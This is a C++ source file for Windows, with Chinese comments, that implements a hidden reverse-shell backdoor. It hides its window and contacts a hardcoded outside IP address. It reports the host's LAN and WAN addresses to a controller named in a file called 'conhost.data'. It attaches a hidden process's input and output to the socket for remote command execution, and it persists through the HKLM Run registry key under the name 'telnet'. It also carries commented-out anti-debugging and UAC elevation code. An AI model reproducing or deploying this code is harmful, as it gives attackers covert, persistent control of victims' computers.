
// 设置连接器选项
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#include <winsock2.h>
#include <ws2tcpip.h>
// #include <windows.h>
#include <stdio.h>
#include <iostream>
#include <thread>
#include <random>
#include <time.h>
#include <string>
#include <string.h>
#include <winternl.h>
#include <intrin.h>
#include <fstream>
#include <atomic>
#include "isdebug.h"
#pragma comment(lib, "ws2_32")
int MasterPort;
using namespace std;
string ip;
int serverPort;
bool ServerState = false;
string SEID;
SOCKET HealthyBeat;

std::atomic<bool> ServerHealthCheck(false);
string GetFirstLocalIPAddress();
// void sendToServer(bool state = true);
void open_telnet();
void HealthCheck();
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);
string getMyWanIp()
{
	WSADATA wsaData;
	SOCKADDR_IN addr;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(2063);
	addr.sin_addr.s_addr = inet_addr("43.138.236.72");
	connect(s, (SOCKADDR *)&addr, sizeof(addr));
	char buf[1024];
	recv(s, buf, 1024, 0);
	return buf;
}

std::string getMyLanIp()
{
	WSADATA wsaData;
	char hostname[256];
	struct addrinfo hints, *result = nullptr;
	struct addrinfo *ptr = nullptr;
	char ip[INET_ADDRSTRLEN];
	std::string ipAddress;

	// Initialize Winsock
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		std::cerr << "WSAStartup failed" << std::endl;
		return "";
	}

	// Get the local hostname
	if (gethostname(hostname, sizeof(hostname)) != 0)
	{
		std::cerr << "Error getting hostname" << std::endl;
		WSACleanup();
		return "";
	}

	// Set up hints for getaddrinfo
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET; // IPv4 only
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Get address info
	if (getaddrinfo(hostname, nullptr, &hints, &result) != 0)
	{
		std::cerr << "Error getting address info" << std::endl;
		WSACleanup();
		return "";
	}

	// Iterate through the address list and find the first IPv4 address
	for (ptr = result; ptr != nullptr; ptr = ptr->ai_next)
	{
		if (ptr->ai_family == AF_INET)
		{
			struct sockaddr_in *ipv4 = (struct sockaddr_in *)ptr->ai_addr;
			inet_ntop(AF_INET, &(ipv4->sin_addr), ip, sizeof(ip));
			ipAddress = ip;
			break; // Only get the first available IPv4 address
		}
	}

	// Clean up
	freeaddrinfo(result);
	WSACleanup();

	return ipAddress;
}
SOCKET s;
WSADATA wsaData;
SOCKADDR_IN addr, addr2;
void GetConnectForServer(bool state = true)
{

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(serverPort);
	addr.sin_addr.s_addr = inet_addr(ip.c_str());
	while (connect(s, (SOCKADDR *)&addr, sizeof(addr)) != 0)
		;
	std::string lanip = getMyLanIp();
	string wanip = getMyWanIp();
	send(s, "Client", strlen("Client"), 0);
	char buf[2048];
	recv(s, buf, sizeof(buf), 0);
	if (strcmp(((string)buf).c_str(), "Recv") == 0)
	{
		cout << "OD";
		string sendBuf = wanip + " " + lanip + " " + to_string(MasterPort);
		send(s, sendBuf.c_str(), strlen(sendBuf.c_str()), 0);
		recv(s, buf, sizeof(buf), 0);
		SEID = buf;
		addr2.sin_family = AF_INET;
		addr2.sin_port = htons(serverPort);
		addr2.sin_addr.s_addr = inet_addr(ip.c_str());
		while (connect(HealthyBeat, (SOCKADDR *)&addr2, sizeof(addr2)) != 0)
			;
		send(HealthyBeat, SEID.c_str(), strlen(SEID.c_str()), 0);
		while (ServerHealthCheck.exchange(true, std::memory_order_acquire))
			;
		ServerState = true;
		ServerHealthCheck.exchange(false, std::memory_order_release);
	}
	return;
}

void open_telnet()
{
	SOCKET SSocket;
	PROCESS_INFORMATION Processinfo;
	STARTUPINFO Startupinfo;
	char szCMDPath[255];

	// 配内存资源，初始化数据
	ZeroMemory(&Processinfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&Startupinfo, sizeof(STARTUPINFO));

	// 开始连接远程服务器，并配置隐藏窗口结构体
	SSocket = s;
	Startupinfo.cb = sizeof(STARTUPINFO);
	Startupinfo.wShowWindow = SW_HIDE;
	Startupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	Startupinfo.hStdInput = (HANDLE)SSocket;
	Startupinfo.hStdOutput = (HANDLE)SSocket;
	Startupinfo.hStdError = (HANDLE)SSocket;
	// cout << "32";
	// 创建匿名管道
	CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &Startupinfo, &Processinfo);
	WaitForSingleObject(Processinfo.hProcess, INFINITE);
	CloseHandle(Processinfo.hProcess);
	CloseHandle(Processinfo.hThread);
	// cout << "32";
	// 关闭进程句柄
	closesocket(SSocket);
	WSACleanup();
	// 关闭连接卸载ws2_32.dll
}
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	switch (dwCtrlType)
	{
	case CTRL_CLOSE_EVENT: // 关闭
		exit(0);
		break;
	case CTRL_LOGOFF_EVENT: // 用户退出
		exit(0);
		break;
	case CTRL_SHUTDOWN_EVENT: // 系统被关闭时.
		exit(0);
		break;
	}

	return 0;
}
VOID ManagerRun(LPCSTR exe, LPCSTR param, INT nShow)
{
	SHELLEXECUTEINFO ShExecInfo;
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = "runas";
	ShExecInfo.lpFile = exe;
	ShExecInfo.lpParameters = param;
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = nShow;
	ShExecInfo.hInstApp = NULL;
	BOOL ret = ShellExecuteEx(&ShExecInfo);
	CloseHandle(ShExecInfo.hProcess);
	return;
}
bool SettleBoot(LPCSTR keyname,
				LPCSTR fullName = _pgmptr,
				LPCSTR param = NULL)
{
	HKEY hKey;
	char str[280];
	LPCSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
	if (lRet == ERROR_SUCCESS)
	{
		if (param != NULL)
		{
			sprintf(str, "\"%s\" %s", fullName, param);
		}

		lRet = RegSetValueEx(hKey, keyname, 0, REG_SZ, (BYTE *)(param == NULL ? fullName : str), strlen(param == NULL ? fullName : str));
		RegCloseKey(hKey);
		if (lRet != ERROR_SUCCESS)
		{
			return false;
		}
		return true;
	}
	else
	{
		return false;
	}
}
void LoadData()
{
	ifstream in;
	in.open("conhost.data", ios::out);
	if (in.is_open())
	{
		getline(in, ip);
		string port;
		getline(in, port);
		serverPort = stoi(port);
	}
	else
	{
		ip = "127.0.0.1";
		serverPort = 2060;
	}
}
void healthyCheck(SOCKET HealthyBeat)
{
	int timeout = 10000; // 设置超时时间为 10 秒
	setsockopt(HealthyBeat, SOL_SOCKET, SO_RCVTIMEO, (char *)timeout, sizeof(timeout));
	setsockopt(HealthyBeat, SOL_SOCKET, SO_SNDTIMEO, (char *)timeout, sizeof(timeout));
	while (1)
	{
		char buf[8192] = {0};
		int state = recv(HealthyBeat, buf, sizeof(buf), 0);
		int state1 = send(HealthyBeat, buf, strlen(buf), 0);
		if (state == SOCKET_ERROR || state1 == SOCKET_ERROR)
		{
			while (ServerHealthCheck.exchange(true, std::memory_order_acquire))
				;
			ServerState = false;
			ServerHealthCheck.exchange(false, std::memory_order_release);
			return;
		}
	}
}
int main(int argc, char *argv[])
{
	// if (is_deBUG())
	// {
	// 	exit(0);
	// }
	// if (argc == 1)
	// {
	// 	ManagerRun(argv[0], "2", SW_SHOWNORMAL);
	// 	exit(0);
	// }
	// else if (argc == 2)
	// {
	LoadData();
	SettleBoot("telnet");
	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
	GetConnectForServer();
	cout << "treu";
	thread healthCheckThread = thread(healthyCheck, HealthyBeat);
	thread openTelnet = thread(open_telnet);
	while (1)
	{
		// cout << "1";
		while (ServerHealthCheck.exchange(true, std::memory_order_acquire))
			;
		if (ServerState == false)
		{
			openTelnet.detach();
			healthCheckThread.detach();
			GetConnectForServer();
			healthCheckThread = thread(healthyCheck, HealthyBeat);
			openTelnet = thread(open_telnet);
		}
		ServerHealthCheck.exchange(false, std::memory_order_release);
	}

	// }
}
